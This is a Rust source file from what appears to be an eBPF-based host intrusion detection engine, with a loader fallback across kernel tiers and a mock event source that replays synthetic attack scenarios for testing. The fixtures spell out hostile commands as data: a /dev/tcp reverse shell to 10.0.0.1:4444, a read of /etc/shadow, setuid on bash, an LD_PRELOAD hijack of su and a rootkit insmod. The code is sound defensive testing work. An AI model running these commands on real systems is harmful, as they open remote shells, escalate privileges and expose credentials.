use anyhow::Result;
use async_trait::async_trait;
use ks_core::event::{af, EventHeader, ExecEvent, FileEvent, NetEvent, SignalEvent};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SourceKind {
    EbpfModern,
    EbpfLegacy,
    EbpfAncient,
    EbpfAncientNoBtf,
    EbpfLegacyNoBtf,
    Mock,
    FileReplay,
}

impl SourceKind {
    pub fn as_str(&self) -> &'static str {
        match self {
            SourceKind::EbpfModern => "eBPF-Modern (5.8+ ringbuf)",
            SourceKind::EbpfLegacy => "eBPF-Legacy (4.x perfbuf)",
            SourceKind::EbpfAncient => "eBPF-Ancient (3.10+ BTF backport)",
            SourceKind::EbpfAncientNoBtf => "eBPF-Ancient (NOBTF, C loader sidecar)",
            SourceKind::EbpfLegacyNoBtf => "eBPF-Legacy (NOBTF, 4.19 C loader)",
            SourceKind::Mock => "Mock 回放",
            SourceKind::FileReplay => "文件回放",
        }
    }
}

#[async_trait]
pub trait EventSource: Send {
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;

    fn kind(&self) -> SourceKind;

    fn description(&self) -> &str;

    fn is_mock(&self) -> bool {
        matches!(self.kind(), SourceKind::Mock)
    }

    fn protected_pids(&self) -> &[u32] {
        &[]
    }
}

pub struct MockEventSource {
    events: Vec<Vec<u8>>,
    cursor: usize,
    loop_mode: bool,
}

impl MockEventSource {
    pub fn new_with_all_scenarios() -> Self {
        let base_ns: u64 = 100_000_000_000;
        let mut events = Vec::new();
        events.extend(Self::reverse_shell_scenario(base_ns));
        events.extend(Self::ransomware_scenario(base_ns + 60_000_000_000));
        events.extend(Self::privilege_escalation_scenario(
            base_ns + 120_000_000_000,
        ));
        events.extend(Self::dns_tunnel_scenario(base_ns + 180_000_000_000));
        events.extend(Self::rootkit_scenario(base_ns + 240_000_000_000));
        events.extend(Self::baseline_scenario(base_ns + 300_000_000_000));
        Self {
            events,
            cursor: 0,
            loop_mode: true,
        }
    }

    pub fn new_with_scenario(scenario: MockScenario) -> Self {
        let base_ns: u64 = 100_000_000_000;
        let events = match scenario {
            MockScenario::ReverseShell => Self::reverse_shell_scenario(base_ns),
            MockScenario::Ransomware => Self::ransomware_scenario(base_ns),
            MockScenario::PrivilegeEscalation => Self::privilege_escalation_scenario(base_ns),
            MockScenario::DnsTunnel => Self::dns_tunnel_scenario(base_ns),
            MockScenario::Rootkit => Self::rootkit_scenario(base_ns),
            MockScenario::Baseline => Self::baseline_scenario(base_ns),
            MockScenario::All => Self::new_with_all_scenarios().events,
        };
        Self {
            events,
            cursor: 0,
            loop_mode: false,
        }
    }

    pub fn with_loop(mut self, loop_mode: bool) -> Self {
        self.loop_mode = loop_mode;
        self
    }
    pub fn remaining(&self) -> usize {
        self.events.len() - self.cursor
    }

    fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 1234, base_ns, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 1234, base_ns + 100_000_000, b"bash", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("10.0.0.1"),
                sport: 54321,
                dport: 4444,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 1234, base_ns + 200_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/shadow"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&make_header(2, 1234, base_ns + 300_000_000, b"bash", 0)),
        ]
    }

    fn ransomware_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 5678;
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"encryptor", 59),
            filename: make_cstr_256("/tmp/encryptor"),
            args: make_cstr_512("/tmp/encryptor --target /home/user/docs"),
        })];
        for (i, fname) in [
            "report.pdf.encrypted",
            "budget.xlsx.encrypted",
            "img001.jpg.encrypted",
            "img002.jpg.encrypted",
        ]
        .iter()
        .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    12,
                    pid,
                    base_ns + (i as u64 + 1) * 50_000_000,
                    b"encryptor",
                    1,
                ),
                filename: make_cstr_256(fname),
                bytes: 102400,
                fd: (i + 3) as i32,
                flags: 1,
            }));
        }
        for (i, fname) in ["report.pdf", "budget.xlsx", "img001.jpg", "img002.jpg"]
            .iter()
            .enumerate()
        {
            events.push(encode_struct(&FileEvent {
                header: make_header(
                    13,
                    pid,
                    base_ns + (i as u64 + 5) * 50_000_000,
                    b"encryptor",
                    87,
                ),
                filename: make_cstr_256(fname),
                bytes: 0,
                fd: 0,
                flags: 0,
            }));
        }
        // 8-31 探针补发射后真机可见的事件类型：批量 rename（新路径语义）也纳入回放，
        // 与 sys_exit rename 分支的 file_event 布局一致
        events.push(encode_struct(&FileEvent {
            header: make_header(14, pid, base_ns + 455_000_000, b"encryptor", 82),
            filename: make_cstr_256("archive.zip.encrypted"),
            bytes: 0,
            fd: -1,
            flags: 0,
        }));
        events.push(encode_struct(&FileEvent {
            header: make_header(12, pid, base_ns + 500_000_000, b"encryptor", 1),
            filename: make_cstr_256("README_FOR_DECRYPT.txt"),
            bytes: 2048,
            fd: 11,
            flags: 1,
        }));
        events
    }

    fn privilege_escalation_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 3456;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"chmod", 59),
                filename: make_cstr_256("/bin/chmod"),
                args: make_cstr_512("chmod +s /bin/bash"),
            }),
            encode_struct(&FileEvent {
                header: make_header(15, pid, base_ns + 100_000_000, b"chmod", 15),
                filename: make_cstr_256("/bin/bash"),
                bytes: 0,
                fd: 0,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/etc/sudoers"),
                bytes: 256,
                fd: 3,
                flags: 1,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, pid + 1, base_ns + 300_000_000, b"bash", 59),
                filename: make_cstr_256("/bin/bash"),
                args: make_cstr_512("LD_PRELOAD=/tmp/malicious.so /bin/su"),
            }),
            encode_struct(&SignalEvent {
                header: make_header(30, pid, base_ns + 400_000_000, b"strace", 101),
                target_pid: 1,
                signal: 0,
            }),
        ]
    }

    fn dns_tunnel_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 7890;
        let dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
        let mut events = vec![encode_struct(&ExecEvent {
            header: make_header(1, pid, base_ns, b"dnstunnel", 59),
            filename: make_cstr_256("/tmp/dnstunnel"),
            args: make_cstr_512("dnstunnel --client"),
        })];
        for (i, dns) in dns_servers.iter().enumerate() {
            events.push(encode_struct(&NetEvent {
                header: make_header(
                    24,
                    pid,
                    base_ns + (i as u64 + 1) * 1_000_000_000,
                    b"dnstunnel",
                    0,
                ),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32(dns),
                sport: 12345 + i as u16,
                dport: 53,
                proto: 17,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }));
        }
        events
    }

    fn rootkit_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        let pid = 9999;
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, pid, base_ns, b"insmod", 59),
                filename: make_cstr_256("/sbin/insmod"),
                args: make_cstr_512("insmod /tmp/rootkit.ko"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, pid, base_ns + 100_000_000, b"insmod", 2),
                filename: make_cstr_256("/proc/kallsyms"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&FileEvent {
                header: make_header(12, pid, base_ns + 200_000_000, b"bash", 1),
                filename: make_cstr_256("/boot/grub/grub.cfg"),
                bytes: 4096,
                fd: 4,
                flags: 1,
            }),
            encode_struct(&SignalEvent {
                header: make_header(31, pid, base_ns + 300_000_000, b"bash", 62),
                target_pid: 100,
                signal: 9,
            }),
        ]
    }

    fn baseline_scenario(base_ns: u64) -> Vec<Vec<u8>> {
        vec![
            encode_struct(&ExecEvent {
                header: make_header(1, 5000, base_ns, b"ls", 59),
                filename: make_cstr_256("/bin/ls"),
                args: make_cstr_512("ls -la /home"),
            }),
            encode_struct(&FileEvent {
                header: make_header(10, 5001, base_ns + 50_000_000, b"cat", 2),
                filename: make_cstr_256("/etc/hosts"),
                bytes: 0,
                fd: 3,
                flags: 0,
            }),
            encode_struct(&ExecEvent {
                header: make_header(1, 5002, base_ns + 100_000_000, b"wget", 59),
                filename: make_cstr_256("/usr/bin/wget"),
                args: make_cstr_512("wget https://example.com/pkg.tar.gz"),
            }),
            encode_struct(&NetEvent {
                header: make_header(20, 5002, base_ns + 150_000_000, b"wget", 42),
                saddr: ipv4_to_u32("192.168.1.100"),
                daddr: ipv4_to_u32("93.184.216.34"),
                sport: 54322,
                dport: 443,
                proto: 6,
                family: af::AF_INET,
                saddr6: [0u8; 16],
                daddr6: [0u8; 16],
                _pad3: [0u8; 2],
            }),
        ]
    }
}

#[async_trait]
impl EventSource for MockEventSource {
    async fn next_bytes(&mut self) -> Result<Option<Vec<u8>>> {
        if self.cursor >= self.events.len() {
            if self.loop_mode {
                self.cursor = 0;
            } else {
                return Ok(None);
            }
        }
        let data = self.events[self.cursor].clone();
        self.cursor += 1;
        Ok(Some(data))
    }
    fn kind(&self) -> SourceKind {
        SourceKind::Mock
    }
    fn description(&self) -> &str {
        "mock 事件源（场景回放）"
    }
    fn is_mock(&self) -> bool {
        true
    }
}

#[cfg(target_os = "linux")]
pub struct LinuxEventSource;

#[cfg(target_os = "linux")]
impl Default for LinuxEventSource {
    fn default() -> Self {
        Self::new()
    }
}

impl LinuxEventSource {
    pub fn new() -> Self {
        Self
    }
}

#[cfg(target_os = "linux")]
#[async_trait]
impl EventSource for LinuxEventSource {
    async fn next_bytes(&mut self) -> anyhow::Result<Option<Vec<u8>>> {
        Ok(None)
    }
    fn kind(&self) -> SourceKind {
        SourceKind::EbpfModern
    }
    fn description(&self) -> &str {
        "Linux eBPF (stub)"
    }
    fn is_mock(&self) -> bool {
        false
    }
}

fn make_header(event_type: u32, pid: u32, ts: u64, comm: &[u8], nr: i32) -> EventHeader {
    let mut buf = [0u8; 16];
    let len = comm.len().min(16);
    buf[..len].copy_from_slice(&comm[..len]);
    EventHeader {
        event_type,
        _pad1: 0,
        timestamp_ns: ts,
        pid,
        tid: pid,
        uid: if pid < 5000 { 0 } else { 1000 },
        ppid: if pid > 100 { pid / 10 } else { 0 },
        comm: buf,
        syscall_nr: nr,
        _pad2: 0,
        retval: 0,
    }
}

fn make_cstr_256(s: &str) -> [u8; 256] {
    let mut buf = [0u8; 256];
    let len = s.len().min(255);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn make_cstr_512(s: &str) -> [u8; 512] {
    let mut buf = [0u8; 512];
    let len = s.len().min(511);
    buf[..len].copy_from_slice(s.as_bytes());
    buf
}

fn ipv4_to_u32(addr: &str) -> u32 {
    let parts: Vec<u8> = addr
        .split('.')
        .filter_map(|p| p.parse::<u8>().ok())
        .collect();
    if parts.len() == 4 {
        u32::from_ne_bytes([parts[0], parts[1], parts[2], parts[3]])
    } else {
        0
    }
}

fn encode_struct<T: Copy>(s: &T) -> Vec<u8> {
    let size = core::mem::size_of::<T>();
    let mut data = vec![0u8; size];
    unsafe {
        core::ptr::copy_nonoverlapping(s as *const T as *const u8, data.as_mut_ptr(), size);
    }
    data
}

#[derive(Debug, Clone, Copy)]
pub enum MockScenario {
    ReverseShell,
    Ransomware,
    PrivilegeEscalation,
    DnsTunnel,
    Rootkit,
    Baseline,
    All,
}

#[cfg(target_os = "linux")]
pub use linux_impl::*;
#[cfg(not(target_os = "linux"))]
pub use mock_only::*;

#[cfg(target_os = "linux")]
static RELEASED_DIRS: std::sync::Mutex<Vec<std::path::PathBuf>> =
    std::sync::Mutex::new(Vec::new());

/// 清理本进程释放的私有临时目录（优雅退出路径调用；崩溃残留由下次启动的
/// sweep_stale_run_dirs 兜底清扫）
#[cfg(target_os = "linux")]
pub fn cleanup_released_dirs() {
    let dirs = RELEASED_DIRS
        .lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner);
    for d in dirs.iter() {
        let _ = std::fs::remove_dir_all(d);
    }
}

#[cfg(not(target_os = "linux"))]
pub fn cleanup_released_dirs() {}

#[cfg(target_os = "linux")]
mod linux_impl {
    pub use super::{EventSource, MockEventSource, SourceKind};
    use crate::ebpf_perf_source::EbpfPerfSource;
    use crate::ebpf_source::EbpfModernSource;
    use crate::loader::{BpfMapReader, EbpfLoader, MockBpfMapReader};
    use crate::tier_detect::detect_ebpf_tier;
    use std::sync::Arc;

    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        match detect_ebpf_tier() {
            Some(SourceKind::EbpfModern) => {
                log::info!("[tier-detect] 当前内核支持Modern tier (5.8+ ringbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfModern).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] eBPF Modern tier加载成功,{}个程序已attach",
                            loader.attached_probe_count()
                        );
                        let map_reader = loader.map_reader();
                        return (Box::new(EbpfModernSource::new(loader)), map_reader);
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Modern tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfLegacy) => {
                log::info!("[tier-detect] 当前内核走Legacy tier (4.x perfbuf)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfLegacy).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Legacy tier加载成功,{}个程序已attach",
                            loader.attached_probe_count()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfLegacy)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Legacy tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfLegacyNoBtf) => {
                log::info!(
                    "[tier-detect] Legacy tier无BTF,尝试CLoaderSource (ks_loader --stream ks_main_legacy_nobtf.o)"
                );
                match try_cloader_source_legacy().await {
                    Ok((source, map_reader)) => {
                        log::info!("[tier-detect] CLoaderSource (legacy_nobtf)启动成功");
                        return (Box::new(source), map_reader);
                    }
                    Err(e) => {
                        log::warn!(
                            "[tier-detect] CLoaderSource (legacy_nobtf)启动失败: {} - fallback mock",
                            e
                        );
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            Some(SourceKind::EbpfAncient) => {
                if !crate::tier_detect::btf_available() {
                    log::info!("[tier-detect] Ancient tier无BTF,尝试CLoaderSource (ks_loader --stream)");
                    match try_cloader_source().await {
                        Ok((source, map_reader)) => {
                            log::info!("[tier-detect] CLoaderSource启动成功");
                            return (Box::new(source), map_reader);
                        }
                        Err(e) => {
                            log::warn!(
                                "[tier-detect] CLoaderSource启动失败: {} - fallback aya + mock",
                                e
                            );
                        }
                    }
                }
                log::info!("[tier-detect] 当前内核走Ancient tier (3.10+ BTF backport)");
                let mut loader = EbpfLoader::new();
                match loader.start_all(SourceKind::EbpfAncient).await {
                    Ok(_) => {
                        log::info!(
                            "[tier-detect] Ancient tier加载成功,{}个程序已attach",
                            loader.attached_probe_count()
                        );
                        let map_reader = loader.map_reader();
                        return (
                            Box::new(EbpfPerfSource::new(loader, SourceKind::EbpfAncient)),
                            map_reader,
                        );
                    }
                    Err(e) => {
                        log::warn!("[tier-detect] Ancient tier加载失败: {} - fallback mock", e);
                    }
                }
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
            _ => {
                log::warn!("[tier-detect] 内核版本无法识别或太老,fallback mock");
                (
                    Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
                    Some(Arc::new(MockBpfMapReader)),
                )
            }
        }
    }

    async fn try_cloader_source() -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        try_cloader_source_for("ancient_nobtf").await
    }

    async fn try_cloader_source_legacy() -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        try_cloader_source_for("legacy_nobtf").await
    }

    async fn try_cloader_source_for(
        tier_suffix: &str,
    ) -> anyhow::Result<(
        crate::cloader_source::CLoaderSource,
        Option<Arc<dyn BpfMapReader>>,
    )> {
        use crate::cloader_source::CLoaderSource;

        let compat = match tier_suffix {
            "ancient_nobtf" => crate::tier_detect::nobtf_release_compatible(),
            "legacy_nobtf" => crate::tier_detect::legacy_nobtf_release_compatible(),
            other => anyhow::bail!("未知nobtf tier suffix: {}", other),
        };
        if let Err(reason) = compat {
            log::warn!("[cloader] {}", reason);
            anyhow::bail!("{}", reason);
        }

        let loader_path = find_ks_loader_binary()?;

        let object_path = match tier_suffix {
            "ancient_nobtf" => find_ancient_nobtf_object()?,
            "legacy_nobtf" => find_legacy_nobtf_object()?,
            _ => unreachable!(),
        };

        log::info!(
            "[cloader] spawn ks_loader --stream {} (loader={}, obj={})",
            object_path.display(),
            loader_path.display(),
            object_path.display(),
        );

        let source = CLoaderSource::spawn(
            loader_path.to_str().expect("loader_path非UTF-8"),
            object_path.to_str().expect("object_path非UTF-8"),
        )?;

        Ok((source, None))
    }

    /// 本进程释放过的私有目录登记：优雅退出时统一删除
    fn record_released_dir(dir: std::path::PathBuf) {
        super::RELEASED_DIRS
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
            .push(dir);
    }

    /// 启动期清扫：删除"其他进程"残留的 ks-run-* 目录（目录名内嵌 pid，
    /// 仅当该 pid 的进程已不存在时才删，绝不碰仍在运行的实例）
    fn sweep_stale_run_dirs(dir: &std::path::Path) {
        let Ok(entries) = std::fs::read_dir(dir) else { return };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            let Some(rest) = name.strip_prefix("ks-run-") else { continue };
            let Some(pid_str) = rest.split('-').next() else { continue };
            let Ok(pid) = pid_str.parse::<u32>() else { continue };
            if pid == std::process::id() {
                continue; // 自己的目录由退出清理负责
            }
            if !std::path::Path::new(&format!("/proc/{pid}")).exists() {
                let _ = std::fs::remove_dir_all(entry.path());
                log::debug!("[cloader] 清扫残留临时目录 {}", entry.path().display());
            }
        }
    }

    fn release_to_temp(name: &str, bytes: &[u8], mode: u32) -> anyhow::Result<std::path::PathBuf> {
        use std::io::Write;
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};

        let dir = std::env::var_os("TMPDIR")
            .map(std::path::PathBuf::from)
            .unwrap_or_else(|| std::path::PathBuf::from("/tmp"));

        // 每次释放用 root-only 的私有子目录（随机后缀防预占/symlink），
        // 旧实现用可预测文件名 File::create：跟随 symlink + 0644→chmod 有竞态窗口，
        // root 引擎面临本地 symlink 攻击（攻击者可替换即将执行的 ks_loader）
        let random: u64 = {
            use std::time::{SystemTime, UNIX_EPOCH};
            let nanos = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .map(|d| d.subsec_nanos() as u64)
                .unwrap_or(0);
            nanos ^ ((std::process::id() as u64) << 32)
        };
        sweep_stale_run_dirs(&dir);

        let sub = dir.join(format!("ks-run-{}-{:016x}", std::process::id(), random));
        std::fs::create_dir(&sub)
            .map_err(|e| anyhow::anyhow!("创建私有临时目录 {} 失败: {}", sub.display(), e))?;
        // 收紧为 0700（create_dir 受 umask 影响）
        let _ = std::fs::set_permissions(&sub, std::fs::Permissions::from_mode(0o700));
        record_released_dir(sub.clone());

        let path = sub.join(format!("{}.bin", name));
        // O_EXCL(create_new) + O_NOFOLLOW：私有目录内再加一层防御
        let mut f = std::fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .mode(0o600)
            .custom_flags(0o2000000) // O_NOFOLLOW
            .open(&path)
            .map_err(|e| anyhow::anyhow!("创建临时文件 {} 失败: {}", path.display(), e))?;
        f.write_all(bytes)
            .map_err(|e| anyhow::anyhow!("写入临时文件 {} 失败: {}", path.display(), e))?;
        drop(f);
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(mode))
            .map_err(|e| anyhow::anyhow!("chmod {} 失败: {}", path.display(), e))?;

        log::debug!(
            "[cloader] 释放内嵌 {} 到 {} ({} bytes, mode {:o})",
            name,
            path.display(),
            bytes.len(),
            mode,
        );
        Ok(path)
    }

    fn find_ks_loader_binary() -> anyhow::Result<std::path::PathBuf> {
        if let Ok(p) = std::env::var("KS_LOADER_PATH") {
            let path = std::path::PathBuf::from(&p);
            if path.is_file() {
                log::debug!("[cloader] ks_loader来自KS_LOADER_PATH={}", path.display());
                return Ok(path);
            }
            log::warn!("[cloader] KS_LOADER_PATH={}但文件不存在,改用内嵌", p);
        }

        let bytes = crate::loader::ebpf_objects::ks_loader_static().ok_or_else(|| {
            anyhow::anyhow!(
                "二进制内无内嵌ks_loader(编译期static预编失败);\
                 如需外部指定,设KS_LOADER_PATH环境变量"
            )
        })?;
        release_to_temp("ks_loader", bytes, 0o500)
    }

    fn find_ancient_nobtf_object() -> anyhow::Result<std::path::PathBuf> {
        const OBJ_NAME: &str = "ks_main_ancient_nobtf.o";

        if let Ok(dir) = std::env::var("KS_EBPF_DIR") {
            let p = std::path::PathBuf::from(&dir).join(OBJ_NAME);
            if p.is_file() {
                log::debug!("[cloader] {}来自KS_EBPF_DIR={}", OBJ_NAME, p.display());
                return Ok(p);
            }
            log::warn!(
                "[cloader] KS_EBPF_DIR={}但{}不存在,改用内嵌",
                dir,
                OBJ_NAME,
            );
        }

        let bytes =
            crate::loader::ebpf_objects::ebpf_object_for("ancient_nobtf").ok_or_else(|| {
                anyhow::anyhow!(
                    "二进制内无内嵌{}(编译期ancient_nobtf tier未成功编译);\
                     如需外部指定,设KS_EBPF_DIR环境变量",
                    OBJ_NAME,
                )
            })?;
        release_to_temp(OBJ_NAME, bytes, 0o400)
    }

    fn find_legacy_nobtf_object() -> anyhow::Result<std::path::PathBuf> {
        const OBJ_NAME: &str = "ks_main_legacy_nobtf.o";

        if let Ok(dir) = std::env::var("KS_EBPF_DIR") {
            let p = std::path::PathBuf::from(&dir).join(OBJ_NAME);
            if p.is_file() {
                log::debug!("[cloader] {}来自KS_EBPF_DIR={}", OBJ_NAME, p.display());
                return Ok(p);
            }
            log::warn!(
                "[cloader] KS_EBPF_DIR={}但{}不存在,改用内嵌",
                dir,
                OBJ_NAME,
            );
        }

        let bytes =
            crate::loader::ebpf_objects::ebpf_object_for("legacy_nobtf").ok_or_else(|| {
                anyhow::anyhow!(
                    "二进制内无内嵌{}(编译期legacy_nobtf tier未成功编译);\
                     如需外部指定,设KS_EBPF_DIR环境变量",
                    OBJ_NAME,
                )
            })?;
        release_to_temp(OBJ_NAME, bytes, 0o400)
    }
}

#[cfg(not(target_os = "linux"))]
mod mock_only {
    pub use super::{EventSource, MockEventSource};
    use crate::loader::{BpfMapReader, MockBpfMapReader};
    use std::sync::Arc;

    pub async fn default_event_source() -> (Box<dyn EventSource>, Option<Arc<dyn BpfMapReader>>) {
        (
            Box::new(MockEventSource::new_with_all_scenarios().with_loop(true)),
            Some(Arc::new(MockBpfMapReader)),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::aggregator::EventAggregator;

    #[tokio::test(flavor = "current_thread")]
    async fn test_mock_source_decodable() {
        let mut source = MockEventSource::new_with_all_scenarios().with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut n = 0;
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if agg.decode(&bytes).is_ok() {
                n += 1;
            }
        }
        assert!(n > 10);
    }

    #[tokio::test(flavor = "current_thread")]
    async fn test_reverse_shell_scenario() {
        let mut source =
            MockEventSource::new_with_scenario(MockScenario::ReverseShell).with_loop(false);
        let mut agg = EventAggregator::new(10000);
        let mut events = Vec::new();
        while let Ok(Some(bytes)) = source.next_bytes().await {
            if let Ok(e) = agg.decode(&bytes) {
                events.push(e);
            }
        }
        assert_eq!(events.len(), 4);
        assert_eq!(events[1].dport, Some(4444));
    }

    #[test]
    fn test_ipv4_encoding() {
        assert_eq!(ipv4_to_u32("8.8.8.8"), 0x08080808);
        assert_eq!(ipv4_to_u32("10.0.0.1"), u32::from_ne_bytes([10, 0, 0, 1]));
    }
}
